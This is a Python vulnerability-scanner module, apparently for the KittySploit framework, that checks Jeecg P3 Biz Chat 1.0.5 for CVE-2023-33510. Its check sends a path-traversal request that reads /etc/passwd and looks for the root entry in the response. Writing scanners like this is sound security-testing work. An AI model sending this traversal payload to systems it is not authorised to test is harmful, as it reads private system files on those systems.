#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Jeecg P3 Biz Chat 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Jeecg P3 Biz Chat - Local File Inclusion Detection',
        'description': 'Jeecg P3 Biz Chat 1.0.5 allows remote attackers to read arbitrary files through specific parameters.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'jeecg', 'lfi', 'jeecg_p3_biz_chat_project', 'wordpress', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://twitter.com/momika233/status/1670701256535572481',
            'https://carl1l.github.io/2023/05/08/jeecg-p3-biz-chat-1-0-5-jar-has-arbitrary-file-read-vulnerability/',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33510',
            'https://github.com/izj007/wechat',
        ],
        'cve': 'CVE-2023-33510',
    }

    def run(self):
        r = self.http_request(method="GET", path='/chat/imController/showOrDownByurl.do?dbPath=../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Jeecg P3 Biz Chat - Local File Inclusion detected",
                path='/chat/imController/showOrDownByurl.do?dbPath=../../../../../../etc/passwd',
            )
            return True
        return False

